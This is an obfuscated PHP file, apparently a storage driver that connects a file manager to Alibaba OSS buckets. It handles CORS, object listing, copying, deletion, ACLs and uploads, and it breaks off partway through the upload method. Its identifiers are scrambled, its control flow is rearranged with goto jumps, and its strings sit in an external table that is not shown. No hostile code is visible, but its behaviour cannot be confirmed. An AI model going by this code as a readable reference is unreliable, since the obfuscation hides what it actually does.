<?php
 goto aÛ¦Åá¾ğ¿; b°í¹ áøï: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($bñÆøğÖÊÌ) { parent::__construct(); include_once SDK_DIR . $_SERVER[ó¬â¥‰ÊÔ¤Ç£][1210]; $this->_init($bñÆøğÖÊÌ); } public function _init($e®”Ì¶±ôä) { $C‘ƒÃ¾¹Ó® =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; foreach ($e®”Ì¶±ôä as $cÜÂ¢Ê½¤Ë => $bŒÎ×ƒ‘Ø˜) { if (isset($this->{$cÜÂ¢Ê½¤Ë})) { $this->{$cÜÂ¢Ê½¤Ë} = $bŒÎ×ƒ‘Ø˜; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($C‘ƒÃ¾¹Ó®[1211] . LNG($C‘ƒÃ¾¹Ó®[1212])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto BâÀ°ËÑæ‚; DáÖ¶ÑÔèÉ: $D‹Í¸›…±->setMaxAgeSeconds(600); $D‹Í¸›…±->addExposeHeader($c—ò¨ö¨[1218]); $D‹Í¸›…±->addAllowedHeader($c—ò¨ö¨[1213]); goto fÕèøÊˆ§; BâÀ°ËÑæ‚: $c—ò¨ö¨ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $FËÚ˜¥°í = new OSS\Model\CorsConfig(); $D‹Í¸›…± = new OSS\Model\CorsRule(); goto FÜĞÜ…†õ°; FÜĞÜ…†õ°: $D‹Í¸›…±->addAllowedOrigin($c—ò¨ö¨[1213]); $D‹Í¸›…±->addAllowedMethod($c—ò¨ö¨[1214]); $D‹Í¸›…±->addAllowedMethod($c—ò¨ö¨[1215]); goto B„Ö”›·ÏØ; B„Ö”›·ÏØ: $D‹Í¸›…±->addAllowedMethod($c—ò¨ö¨[1216]); $D‹Í¸›…±->addAllowedMethod($c—ò¨ö¨[1217]); $D‹Í¸›…±->addAllowedMethod($c—ò¨ö¨[157]); goto DáÖ¶ÑÔèÉ; fÕèøÊˆ§: $FËÚ˜¥°í->addRule($D‹Í¸›…±); try { $this->client->putBucketCors($this->bucket, $FËÚ˜¥°í); } catch (OSS\Core\OssException $aÚƒàËÓå´) { return !1; } return !0; goto AêËâÍ„‘³; AêËâÍ„‘³: } public function getBucketCors() { goto aøæ´ŠêÔ; aøæ´ŠêÔ: $DîĞòŠÉöÛ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $EÒÊ¥«ö = null; try { $EÒÊ¥«ö = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $få¶Ö„à±Â) { return null; } goto FŠ´šôøòø; FŠ´šôøòø: if (!$EÒÊ¥«ö || !($CóŒˆí£Ñ = $EÒÊ¥«ö->getRules())) { return null; } $fÂÉ»à†Ÿ‹ = $CóŒˆí£Ñ[0]->getAllowedOrigins(); $CàìˆœÂ÷ = $CóŒˆí£Ñ[0]->getAllowedMethods(); goto dœÊÊÚéÉ; cø™’ŠØ³„: return array($DîĞòŠÉöÛ[181] => isset($fÂÉ»à†Ÿ‹[0]) ? $fÂÉ»à†Ÿ‹[0] : $DîĞòŠÉöÛ[33], $DîĞòŠÉöÛ[185] => $CàìˆœÂ÷, $DîĞòŠÉöÛ[1219] => $eëÒŠîµùá, $DîĞòŠÉöÛ[1220] => isset($B“‹ˆƒ¹Ç[0]) ? $B“‹ˆƒ¹Ç[0] : $DîĞòŠÉöÛ[33], $DîĞòŠÉöÛ[183] => isset($D®ÃÎ¬¥“›[0]) ? $D®ÃÎ¬¥“›[0] : $DîĞòŠÉöÛ[33]); goto F±á¨· ë²; dœÊÊÚéÉ: $eëÒŠîµùá = $CóŒˆí£Ñ[0]->getMaxAgeSeconds(); $B“‹ˆƒ¹Ç = $CóŒˆí£Ñ[0]->getExposeHeaders(); $D®ÃÎ¬¥“› = $CóŒˆí£Ñ[0]->getAllowedHeaders(); goto cø™’ŠØ³„; F±á¨· ë²: } public function isBucketCors() { goto BÀ««Êí™ß; A×ÚÊ Æìß: $dò÷ÁäÎÖ = array($E–İ»ÜĞµ’[186], $E–İ»ÜĞµ’[187], $E–İ»ÜĞµ’[188], $E–İ»ÜĞµ’[189], $E–İ»ÜĞµ’[190]); $B‰ºäæô‘š = array_diff($dò÷ÁäÎÖ, $aâê·«âØø); return empty($B‰ºäæô‘š); goto aŞŞİ‰‚Œ•; BÀ««Êí™ß: $E–İ»ÜĞµ’ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cšæ¸¾Ã£Ü = $this->getBucketCors(); if (!$cšæ¸¾Ã£Ü || !is_array($cšæ¸¾Ã£Ü)) { return !1; } goto D§ˆß½êİ…; D§ˆß½êİ…: if ($cšæ¸¾Ã£Ü[$E–İ»ÜĞµ’[181]] != $E–İ»ÜĞµ’[182] || $cšæ¸¾Ã£Ü[$E–İ»ÜĞµ’[183]] != $E–İ»ÜĞµ’[182]) { return !1; } $aâê·«âØø = array_map($E–İ»ÜĞµ’[184], $cšæ¸¾Ã£Ü[$E–İ»ÜĞµ’[185]]); if (!is_array($aâê·«âØø)) { $aâê·«âØø = array(); } goto A×ÚÊ Æìß; aŞŞİ‰‚Œ•: } public function mkfile($a•µğØˆê, $fÇô¡é¬“× = '', $B¸˜ªàñóÚ = REPEAT_RENAME) { $fè‚àÙ¸´ = $this->setContent($a•µğØˆê, $fÇô¡é¬“×); if ($fè‚àÙ¸´ !== !1) { return $this->getPathOuter($a•µğØˆê); } return !1; } public function mkdir($d©ªÑ¦Í™µ, $fÀ°‚®©œ¶ = REPEAT_SKIP) { if ($this->_isFolder($d©ªÑ¦Í™µ)) { return $this->getPathOuter($d©ªÑ¦Í™µ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($d©ªÑ¦Í™µ)); } catch (OSS\Core\OssException $cäº‰‚ò†£) { return !1; } return $this->getPathOuter($d©ªÑ¦Í™µ); } private function fileList($cÓÒ×¶Ø™Å, $Aò’æ‡ã‡À = '', $d”ÒÀ¹ÔŒï = 0) { goto fëËÒ”®­¡; D¿òŞ‡ŞË™: $aâ‡óŠ«‘Ã = $EùÊ¤ø´ê’ = array(); while (!0) { check_abort(); $fÙˆ“†ºÆÓ = array($dŞ¥ĞŒŠ[1221] => $Aò’æ‡ã‡À, $dŞ¥ĞŒŠ[1222] => $E¬°¿Ä¥Ø©, $dŞ¥ĞŒŠ[1223] => $CÖÒÍ‘¥ì, $dŞ¥ĞŒŠ[1224] => $EĞƒÊîàóò); try { $fˆ¸Ş‹âø = $this->client->listObjects($this->bucket, $fÙˆ“†ºÆÓ); } catch (OSS\Core\OssException $FéÍèøó·ò) { break; } $EĞƒÊîàóò = $fˆ¸Ş‹âø->getNextMarker(); $cÈ­ê¦êÊ˜ = $fˆ¸Ş‹âø->getObjectList(); $Eè­¸çñÌ = $fˆ¸Ş‹âø->getPrefixList(); foreach ($cÈ­ê¦êÊ˜ as $fªªª­ˆˆß) { goto B†¸©„²ñÂ; B†¸©„²ñÂ: if ($fªªª­ˆˆß->getKey() == $E¬°¿Ä¥Ø©) { continue; } $cÇ¿—íä¶œ = $fªªª­ˆˆß->getKey(); $C¸Ú¨¼òÁˆ = $fªªª­ˆˆß->getSize(); goto D ßŞªŒ‡Œ; D ßŞªŒ‡Œ: $a†ÉƒÊˆ˜Û = $fªªª­ˆˆß->getLastModified(); $F˜´Ê°Òäó = $d”ÒÀ¹ÔŒï ? array($dŞ¥ĞŒŠ[28] => $cÇ¿—íä¶œ, $dŞ¥ĞŒŠ[77] => $C¸Ú¨¼òÁˆ, $dŞ¥ĞŒŠ[195] => strtotime($a†ÉƒÊˆ˜Û)) : $cÇ¿—íä¶œ; $FŠ§µÕ©İ = $C¸Ú¨¼òÁˆ == 0 && substr($cÇ¿—íä¶œ, strlen($cÇ¿—íä¶œ) - 1, 1) == $dŞ¥ĞŒŠ[8] ? !0 : !1; goto Cõ­¦Ç¥õ; Cõ­¦Ç¥õ: if ($a´Ç¬ƒ‰Î½) { $this->cacheMethod($dŞ¥ĞŒŠ[197], $cÇ¿—íä¶œ, $FŠ§µÕ©İ); $this->cacheMethod($dŞ¥ĞŒŠ[198], $cÇ¿—íä¶œ, array($dŞ¥ĞŒŠ[77] => $C¸Ú¨¼òÁˆ, $dŞ¥ĞŒŠ[1225] => $C¸Ú¨¼òÁˆ, $dŞ¥ĞŒŠ[83] => strtotime($a†ÉƒÊˆ˜Û), $dŞ¥ĞŒŠ[1226] => $a†ÉƒÊˆ˜Û)); } if ($FŠ§µÕ©İ) { $aâ‡óŠ«‘Ã[] = $cÇ¿—íä¶œ; continue; } $EùÊ¤ø´ê’[] = $F˜´Ê°Òäó; goto eŠ‘­â÷‚; eŠ‘­â÷‚: } foreach ($Eè­¸çñÌ as $EíÀ£Ä‹³Û) { $aâ‡óŠ«‘Ã[] = $EíÀ£Ä‹³Û->getPrefix(); if ($a´Ç¬ƒ‰Î½) { $this->cacheMethod($dŞ¥ĞŒŠ[197], $cÇ¿—íä¶œ, !0); } } if ($EĞƒÊîàóò === $dŞ¥ĞŒŠ[33]) { break; } } if ($a´Ç¬ƒ‰Î½) { $this->cacheMethod($dŞ¥ĞŒŠ[197], $cÓÒ×¶Ø™Å, !0); } goto d„‚Àêùñ; eÑƒƒø›¨¢: $EĞƒÊîàóò = $dŞ¥ĞŒŠ[33]; $CÖÒÍ‘¥ì = 1000; $a´Ç¬ƒ‰Î½ = $this->listItemCache === !1 ? !1 : !0; goto D¿òŞ‡ŞË™; fëËÒ”®­¡: $dŞ¥ĞŒŠ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÓÒ×¶Ø™Å = trim($cÓÒ×¶Ø™Å, $dŞ¥ĞŒŠ[8]); $E¬°¿Ä¥Ø© = empty($cÓÒ×¶Ø™Å) ? $dŞ¥ĞŒŠ[33] : $cÓÒ×¶Ø™Å . $dŞ¥ĞŒŠ[8]; goto eÑƒƒø›¨¢; d„‚Àêùñ: return array($dŞ¥ĞŒŠ[74] => $aâ‡óŠ«‘Ã, $dŞ¥ĞŒŠ[73] => $EùÊ¤ø´ê’); goto b‘ëË¹ÎœÏ; b‘ëË¹ÎœÏ: } public function copyFile($C‹í¹õË§–, $Eİ Õº•„‡) { $cÆ£‹éÈ¦§ = $this->size($C‹í¹õË§–); if ($cÆ£‹éÈ¦§ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $C‹í¹õË§–, $this->bucket, $this->pathEncode($Eİ Õº•„‡)); } catch (OSS\Core\OssException $Aë²ˆ—…‡Ç) { return !1; } return $this->getPathOuter($Eİ Õº•„‡); } $D×âòÔØ„Ø = $this->multiCopyObject($C‹í¹õË§–, $Eİ Õº•„‡, $cÆ£‹éÈ¦§); return $D×âòÔØ„Ø ? $this->getPathOuter($Eİ Õº•„‡) : !1; } private function multiCopyObject($aÀÑƒ°ó³Ô, $B“ô±ƒ—ğ¾, $A¸ˆõ­Úè´) { $EîÀæ®è‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; try { goto fîƒ¯¼øôÇ; C‹Ïš÷à¹Ø: $B÷¼òîŠõ = 1024 * 1024 * 10; $B İ«ƒ©¡‹ = $this->client->generateMultiuploadParts($A¸ˆõ­Úè´, $B÷¼òîŠõ); foreach ($B İ«ƒ©¡‹ as $EÈƒŸ“±† => $DÉã¯Û¿Õ—) { $B¤…Í…©¥º = $b–Ø„±¤Ø¿ + (int) $DÉã¯Û¿Õ—[$EîÀæ®è‹[1228]]; $b”å–Â©×ß = (int) $DÉã¯Û¿Õ—[$EîÀæ®è‹[333]] + $B¤…Í…©¥º - 1; $eë—…õÏÆ‰ = array($EîÀæ®è‹[1229] => $B¤…Í…©¥º, $EîÀæ®è‹[1230] => $b”å–Â©×ß); $c®“Ù´Ã§ª[] = $this->client->uploadPartCopy($this->bucket, $aÀÑƒ°ó³Ô, $this->bucket, $this->pathEncode($B“ô±ƒ—ğ¾), $DÊîî˜ğ¤ğ, $c§ß´Œœª÷, $eë—…õÏÆ‰); $DÊîî˜ğ¤ğ = $DÊîî˜ğ¤ğ + 1; } goto A‡Š¢›œ‘; CïçŒ™Ú–ì: $DÊîî˜ğ¤ğ = 1; $b–Ø„±¤Ø¿ = 0; $c®“Ù´Ã§ª = array(); goto C‹Ïš÷à¹Ø; A‡Š¢›œ‘: $Cµ”è…ÃÈ† = array(); foreach ($c®“Ù´Ã§ª as $EÈƒŸ“±† => $a±©ŸÖ‰›¹) { $Cµ”è…ÃÈ†[] = array($EîÀæ®è‹[1231] => $EÈƒŸ“±† + 1, $EîÀæ®è‹[1232] => $a±©ŸÖ‰›¹); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($B“ô±ƒ—ğ¾), $c§ß´Œœª÷, $Cµ”è…ÃÈ†); goto Aµ·½ãíâ; fîƒ¯¼øôÇ: $DÕ´°ì²…ä = array(); if ($E‚Ÿ¦Îë½ = $this->hashMd5($aÀÑƒ°ó³Ô)) { $DÕ´°ì²…ä = array(OSS\OssClient::OSS_HEADERS => array($EîÀæ®è‹[1227] => $E‚Ÿ¦Îë½)); } $c§ß´Œœª÷ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B“ô±ƒ—ğ¾), $DÕ´°ì²…ä); goto CïçŒ™Ú–ì; Aµ·½ãíâ: } catch (OSS\Core\OssException $aŞ¹ÖĞìŸ) { return !1; } return !0; } public function moveFile($aÕÅğíÍ˜, $C……£ÖŸâ©) { if ($this->copyFile($aÕÅğíÍ˜, $C……£ÖŸâ©)) { $this->remove($aÕÅğíÍ˜); return $this->getPathOuter($C……£ÖŸâ©); } return !1; } public function delFile($Bê¶«¦á´¢) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($Bê¶«¦á´¢)); } catch (OSS\Core\OssException $d®àñÏ¢ç¬) { return !1; } return !0; } public function delFolder($fëâ¸ŸÀ´÷) { goto Cóª±¥£Ô; d ôâÙÁÒ: $E˜ÒÁ¼ÇÑ = $this->fileList($fëâ¸ŸÀ´÷); $this->listItemCache = !0; $E…¿×óÅ = trim($fëâ¸ŸÀ´÷, $AÇóÅß¾à¤[8]) . $AÇóÅß¾à¤[8]; goto dã„šØîÌù; Cóª±¥£Ô: $AÇóÅß¾à¤ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->exist($fëâ¸ŸÀ´÷)) { return !0; } $this->listItemCache = !1; goto d ôâÙÁÒ; dã„šØîÌù: if (!empty($fëâ¸ŸÀ´÷) && !in_array($E…¿×óÅ, $E˜ÒÁ¼ÇÑ[$AÇóÅß¾à¤[74]])) { $E˜ÒÁ¼ÇÑ[$AÇóÅß¾à¤[74]][] = $E…¿×óÅ; } $d‰‡·°– = $this->delByBatch($E˜ÒÁ¼ÇÑ[$AÇóÅß¾à¤[73]]); if (!$d‰‡·°–) { return !1; } goto cˆ¶ç‹ÍŠ; cˆ¶ç‹ÍŠ: return $this->delByBatch($E˜ÒÁ¼ÇÑ[$AÇóÅß¾à¤[74]]); goto e†¨ Ç¤ç‹; e†¨ Ç¤ç‹: } private function delByBatch($F´ÓöÈ‰½Œ) { foreach (array_chunk($F´ÓöÈ‰½Œ, 1000) as $Bİ½Æ™ĞÓ) { try { $this->client->deleteObjects($this->bucket, $Bİ½Æ™ĞÓ); } catch (OSS\Core\OssException $b¿¿ì‹¤îÉ) { return !1; } } return !0; } public function rename($cİô¹©ÑÕõ, $B›ùÉ´Êµ) { return $this->renameObject($cİô¹©ÑÕõ, $B›ùÉ´Êµ); } private function fileInfo($d©îÆˆ“Ù, $cˆØóÎÅ·¡ = false, $c´Œ¸’¢ô† = array()) { goto D›ñ‚¸—­†; F¢¥†Ô¬»: if (isset($c´Œ¸’¢ô†[$bßŞ´ÏÔŸ[77]])) { $E¸â¶²Á‰[$bßŞ´ÏÔŸ[77]] = $c´Œ¸’¢ô†[$bßŞ´ÏÔŸ[77]]; } if (isset($c´Œ¸’¢ô†[$bßŞ´ÏÔŸ[83]])) { $E¸â¶²Á‰[$bßŞ´ÏÔŸ[83]] = $c´Œ¸’¢ô†[$bßŞ´ÏÔŸ[83]]; } if (isset($c´Œ¸’¢ô†[$bßŞ´ÏÔŸ[195]]) && !trim($E¸â¶²Á‰[$bßŞ´ÏÔŸ[83]])) { $E¸â¶²Á‰[$bßŞ´ÏÔŸ[83]] = $c´Œ¸’¢ô†[$bßŞ´ÏÔŸ[195]]; } goto dÌï©ëÀô; dÌï©ëÀô: return $E¸â¶²Á‰; goto c´ˆ°¤áàî; d°Ù—»µ¯: $E¸â¶²Á‰[$bßŞ´ÏÔŸ[192]] = $E¸â¶²Á‰[$bßŞ´ÏÔŸ[83]] = 0; $E¸â¶²Á‰[$bßŞ´ÏÔŸ[193]] = $E¸â¶²Á‰[$bßŞ´ÏÔŸ[194]] = !0; if (empty($c´Œ¸’¢ô†)) { $C÷Ø½ ÜÚë = $this->objectMeta($d©îÆˆ“Ù); if (!$C÷Ø½ ÜÚë) { return $E¸â¶²Á‰; } $c´Œ¸’¢ô† = array($bßŞ´ÏÔŸ[83] => strtotime($C÷Ø½ ÜÚë[$bßŞ´ÏÔŸ[1226]]), $bßŞ´ÏÔŸ[77] => $C÷Ø½ ÜÚë[$bßŞ´ÏÔŸ[1225]] + 0); } goto F¢¥†Ô¬»; D›ñ‚¸—­†: $bßŞ´ÏÔŸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¸â¶²Á‰ = array($bßŞ´ÏÔŸ[28] => $this->pathThis($d©îÆˆ“Ù), $bßŞ´ÏÔŸ[75] => $this->getPathOuter($d©îÆˆ“Ù), $bßŞ´ÏÔŸ[29] => $bßŞ´ÏÔŸ[173], $bßŞ´ÏÔŸ[77] => isset($c´Œ¸’¢ô†[$bßŞ´ÏÔŸ[77]]) ? $c´Œ¸’¢ô†[$bßŞ´ÏÔŸ[77]] : 0, $bßŞ´ÏÔŸ[167] => $this->ext($d©îÆˆ“Ù)); if ($cˆØóÎÅ·¡) { return $E¸â¶²Á‰; } goto d°Ù—»µ¯; c´ˆ°¤áàî: } private function folderInfo($C˜çË„Š Ï, $Däƒš¥ Ú = false, $e›–íµ“Ñğ = array()) { goto f¤ŒÁ†¿Ö; f¤ŒÁ†¿Ö: $C˜ò§×ö›Å =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cöÈ„ù“Û = array($C˜ò§×ö›Å[28] => $this->pathThis($C˜çË„Š Ï), $C˜ò§×ö›Å[75] => $this->getPathOuter($C˜ò§×ö›Å[8] . $C˜çË„Š Ï), $C˜ò§×ö›Å[29] => $C˜ò§×ö›Å[76]); if ($Däƒš¥ Ú) { return $cöÈ„ù“Û; } goto e¦ÙÙ¨±; fìŞŒïõî: if (isset($e›–íµ“Ñğ[$C˜ò§×ö›Å[83]])) { $cöÈ„ù“Û[$C˜ò§×ö›Å[83]] = $e›–íµ“Ñğ[$C˜ò§×ö›Å[83]]; } if (isset($e›–íµ“Ñğ[$C˜ò§×ö›Å[192]])) { $cöÈ„ù“Û[$C˜ò§×ö›Å[192]] = $e›–íµ“Ñğ[$C˜ò§×ö›Å[192]]; } return $cöÈ„ù“Û; goto B­²¬ÛŞá; e¦ÙÙ¨±: $cöÈ„ù“Û[$C˜ò§×ö›Å[192]] = $cöÈ„ù“Û[$C˜ò§×ö›Å[83]] = 0; $cöÈ„ù“Û[$C˜ò§×ö›Å[193]] = $cöÈ„ù“Û[$C˜ò§×ö›Å[194]] = !0; if (empty($e›–íµ“Ñğ)) { $C˜çË„Š Ï = rtrim($C˜çË„Š Ï, $C˜ò§×ö›Å[8]) . $C˜ò§×ö›Å[8]; $F´ÔêŠ¿ = $this->objectMeta($C˜çË„Š Ï); if (!$F´ÔêŠ¿) { return $cöÈ„ù“Û; } $e›–íµ“Ñğ = array($C˜ò§×ö›Å[192] => $F´ÔêŠ¿[$C˜ò§×ö›Å[1233]][$C˜ò§×ö›Å[1234]], $C˜ò§×ö›Å[83] => strtotime($F´ÔêŠ¿[$C˜ò§×ö›Å[1226]])); } goto fìŞŒïõî; B­²¬ÛŞá: } public function listPath($f¿¨­ùº¤, $BË¤À†¹šã = false) { $C¹§¶ç‘‘§ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E¶ÂÑ¯‘¾ = $this->fileList($f¿¨­ùº¤, $C¹§¶ç‘‘§[8], !0); foreach ($E¶ÂÑ¯‘¾[$C¹§¶ç‘‘§[74]] as $BÚ·’ÇÓ¢… => $eåó†¤Ë£‘) { $E¶ÂÑ¯‘¾[$C¹§¶ç‘‘§[74]][$BÚ·’ÇÓ¢…] = $this->folderInfo($eåó†¤Ë£‘, $BË¤À†¹šã, $eåó†¤Ë£‘); } foreach ($E¶ÂÑ¯‘¾[$C¹§¶ç‘‘§[73]] as $BÚ·’ÇÓ¢… => $eåó†¤Ë£‘) { $E¶ÂÑ¯‘¾[$C¹§¶ç‘‘§[73]][$BÚ·’ÇÓ¢…] = $this->fileInfo($eåó†¤Ë£‘[$C¹§¶ç‘‘§[28]], $BË¤À†¹šã, $eåó†¤Ë£‘); } return $E¶ÂÑ¯‘¾; } public function has($A›óó–¥æ, $dãµé¶Ê = false, $fÓæÆ³ÏÎ° = true) { goto D šÕªğ÷›; bÅ“œÀ³½—: while (!0) { check_abort(); $b¾áÕ´±ƒ = array($f’ôÎ¸ŞŠÍ[1221] => $f’ôÎ¸ŞŠÍ[8], $f’ôÎ¸ŞŠÍ[1222] => $C¶¯»‰ĞÖ, $f’ôÎ¸ŞŠÍ[1223] => $a°à†Ÿ®Š, $f’ôÎ¸ŞŠÍ[1224] => $c•¡ùõî¡); try { $AÚ“ÔÌ–Íâ = $this->client->listObjects($this->bucket, $b¾áÕ´±ƒ); } catch (OSS\Core\OssException $Fµ¶óÅ) { break; } $c•¡ùõî¡ = $AÚ“ÔÌ–Íâ->getNextMarker(); $eÅÂ¾ŠÉ×ö = $AÚ“ÔÌ–Íâ->getObjectList(); $e¬¯ìäàĞ” = $AÚ“ÔÌ–Íâ->getPrefixList(); if ($dãµé¶Ê) { if (count($eÅÂ¾ŠÉ×ö) > 1 || count($eÅÂ¾ŠÉ×ö) == 1 && $eÅÂ¾ŠÉ×ö[0]->getKey() != $C¶¯»‰ĞÖ) { $BÕ’¸ÖãÉ += count($eÅÂ¾ŠÉ×ö) - 1; } if (!empty($e¬¯ìäàĞ”)) { $fíùè ƒİã += count($e¬¯ìäàĞ”); } if ($c•¡ùõî¡ === $f’ôÎ¸ŞŠÍ[33]) { break; } continue; } if ($fÓæÆ³ÏÎ°) { if (!empty($eÅÂ¾ŠÉ×ö)) { if (count($eÅÂ¾ŠÉ×ö) > 1 || $eÅÂ¾ŠÉ×ö[0]->getKey() != $C¶¯»‰ĞÖ) { return !0; } } } else { if (!empty($e¬¯ìäàĞ”)) { return !0; } } if ($c•¡ùõî¡ === $f’ôÎ¸ŞŠÍ[33]) { break; } } if ($dãµé¶Ê) { return array($f’ôÎ¸ŞŠÍ[201] => $BÕ’¸ÖãÉ, $f’ôÎ¸ŞŠÍ[202] => $fíùè ƒİã); } return !1; goto Dˆô†ÀÏƒ; E£Ù¼ï‹‡: $c•¡ùõî¡ = $f’ôÎ¸ŞŠÍ[33]; $a°à†Ÿ®Š = 500; $BÕ’¸ÖãÉ = $fíùè ƒİã = 0; goto bÅ“œÀ³½—; D šÕªğ÷›: $f’ôÎ¸ŞŠÍ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A›óó–¥æ = trim($A›óó–¥æ, $f’ôÎ¸ŞŠÍ[8]); $C¶¯»‰ĞÖ = empty($A›óó–¥æ) ? $f’ôÎ¸ŞŠÍ[33] : $A›óó–¥æ . $f’ôÎ¸ŞŠÍ[8]; goto E£Ù¼ï‹‡; Dˆô†ÀÏƒ: } public function listAll($DŒ‚”Åî¾—) { $f¡Ïì¶… =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $BÚ¨”±÷›— = $this->fileList($DŒ‚”Åî¾—, $f¡Ïì¶…[33], !0); $b¼ŠÎœ†’¿ = array(); foreach ($BÚ¨”±÷›—[$f¡Ïì¶…[73]] as $Eõç¹»óÚ) { $b¼ŠÎœ†’¿[$Eõç¹»óÚ[$f¡Ïì¶…[28]]] = $Eõç¹»óÚ[$f¡Ïì¶…[77]]; } foreach ($BÚ¨”±÷›—[$f¡Ïì¶…[74]] as $Eõç¹»óÚ) { if (is_string($Eõç¹»óÚ)) { $b¼ŠÎœ†’¿[$Eõç¹»óÚ] = 0; } } return $this->listAllFiles($DŒ‚”Åî¾—, array_keys($b¼ŠÎœ†’¿), $b¼ŠÎœ†’¿); } public function canRead($EéùÂ¦‰­Õ) { $FÕÊ±“……¦ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Eƒ¨ŒÇˆ² = $this->pathAcl($EéùÂ¦‰­Õ); return $Eƒ¨ŒÇˆ² == $FÕÊ±“……¦[1235] || $Eƒ¨ŒÇˆ² == $FÕÊ±“……¦[508] ? !0 : !1; } public function canWrite($b·ºÎêŒÏ‹) { $b÷†ã¤á’Ç = $this->pathAcl($b·ºÎêŒÏ‹); return $b÷†ã¤á’Ç == $_SERVER[ó¬â¥‰ÊÔ¤Ç£][508] ? !0 : !1; } public function pathAcl($CêÇáÓŞ¹) { goto eË¯Ç…Ö‘İ; eË¯Ç…Ö‘İ: $C¸Äã»‘¹à =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $d†íŞÁÉ¢Ã = $this->client->getObjectAcl($this->bucket, $this->pathEncode($CêÇáÓŞ¹)); } catch (OSS\Core\OssException $bÀ‡ÛÒšò¿) { return !1; } goto e¨¨›Û¶öÎ; e¨¨›Û¶öÎ: $CÔÃáŞ¥ÄÓ = $d†íŞÁÉ¢Ã == $C¸Äã»‘¹à[34] ? $this->bucketAcl : $d†íŞÁÉ¢Ã; if ($CÔÃáŞ¥ÄÓ == $C¸Äã»‘¹à[1236]) { return $C¸Äã»‘¹à[1235]; } if ($CÔÃáŞ¥ÄÓ == $C¸Äã»‘¹à[1237]) { return $C¸Äã»‘¹à[508]; } goto d¤õ–ºãÜÚ; d¤õ–ºãÜÚ: return $CÔÃáŞ¥ÄÓ; goto Eµ³Ÿñ°ƒã; Eµ³Ÿñ°ƒã: } private function chmodPath($bÎöÄê¥Ê‘, $fÌÇÓ¡ì“‘ = '') { $fŒ™Ë „ä» =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $eÊã®‚–¦Û = empty($fÌÇÓ¡ì“‘) ? $fŒ™Ë „ä»[1237] : $fÌÇÓ¡ì“‘; $Aªì¼³Ğ®¸ = array($fŒ™Ë „ä»[34], $fŒ™Ë „ä»[191], $fŒ™Ë „ä»[1236], $fŒ™Ë „ä»[1237]); if (!in_array($eÊã®‚–¦Û, $Aªì¼³Ğ®¸)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($bÎöÄê¥Ê‘), $eÊã®‚–¦Û); } catch (OSS\Core\OssException $aË‡ÄƒÃ¸) { return !1; } return !0; } public function getContent($Eš’ÊéëÅõ) { return $this->fileSubstr($Eš’ÊéëÅõ, -1); } public function setContent($dáÙã‹Å¨¸, $e¸»ƒ§Ğ”è = '') { $dŸŠˆÂ­ó =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; try { $a·â¯ éï¯ = $this->trafficLimit($dŸŠˆÂ­ó[1238]); $Eà»Áô = $this->client->putObject($this->bucket, $this->pathEncode($dáÙã‹Å¨¸), $e¸»ƒ§Ğ”è, $a·â¯ éï¯); } catch (OSS\Core\OssException $fÎƒ“²â‡) { return !1; } $B÷™²–¬˜ª = array($dŸŠˆÂ­ó[1227] => trim($Eà»Áô[$dŸŠˆÂ­ó[1239]], $dŸŠˆÂ­ó[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($dáÙã‹Å¨¸))); $this->updateObjMeta($dáÙã‹Å¨¸, $B÷™²–¬˜ª); return isset($Eà»Áô[$dŸŠˆÂ­ó[1240]][$dŸŠˆÂ­ó[1186]]) ? !0 : !1; } private function updateObjMeta($A‘¹Êôª, $AÌ¬­š–í¢) { $A‘¹Êôª = $this->pathEncode($A‘¹Êôª); try { $e×°àè³ŸÙ = array(OSS\OssClient::OSS_HEADERS => $AÌ¬­š–í¢); $this->client->copyObject($this->bucket, $A‘¹Êôª, $this->bucket, $A‘¹Êôª, $e×°àè³ŸÙ); } catch (OSS\Core\OssException $B×ïÅ‹Æ’) { return !1; } return !0; } public function upload($Cª’ÉÉˆ÷§, $câÑœŸ©, $eèš‘ÜøÕ† = false, $Dº·„Õò½— = REPEAT_REPLACE) { $B·İÜÙ…³´ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E·©Ï°÷œÆ = trim($Cª’ÉÉˆ÷§, $B·İÜÙ…³´[8]); $CíœÌ›à‘Ÿ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($B·İÜÙ…³´[1227] => @md5_file($câÑœŸ©)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($Cª’ÉÉˆ÷§))); $CíœÌ›à‘Ÿ = $this->trafficLimit($B·İÜÙ…³´[1238], $CíœÌ›à‘Ÿ); try { 